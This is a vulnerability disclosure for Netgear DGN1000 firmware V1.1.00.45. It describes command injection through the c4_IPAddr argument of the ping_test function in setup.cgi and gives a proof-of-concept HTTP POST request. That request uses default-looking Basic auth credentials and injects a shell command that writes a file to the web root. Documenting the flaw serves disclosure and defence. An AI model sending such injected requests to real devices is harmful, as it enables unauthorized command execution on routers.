### Overview

- Vendor : Netgear
- Product : DGN1000
- Version : DGN1000WW_V1.1.00.45.img
- Firmware download address : https://www.downloads.netgear.com/files/GDC/DGN1000/DGN1000WW_V1.1.00.45.zip

### Vulnerability details

A vulnerability was determined in Netgear DGN1000WW_V1.1.00.45.img. This impacts the function ping_test of the file setup.cgi. This manipulation of the argument c4_IPAddr causes command injection. The attack is possible to be carried out remotely. The exploit has been publicly disclosed and may be utilized.

![1756293462445](image/ping_test/1756293462445.png)
![1756293485571](image/ping_test/1756293485571.png)

### PoC

```
POST /setup.cgi HTTP/1.1
Host: 192.168.0.1
Content-Length: 152
Cache-Control: max-age=0
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Origin: http://192.168.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.1/diag.htm&todo=cfg_init
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

IPAddr1=192&IPAddr2=168&IPAddr3=1&IPAddr4=1&ping=Ping&todo=ping_test&this_file=diag.htm&next_file=diagping.htm&c4_IPAddr=1||/usr/sbin/echo 0 >/www/1.txt
```


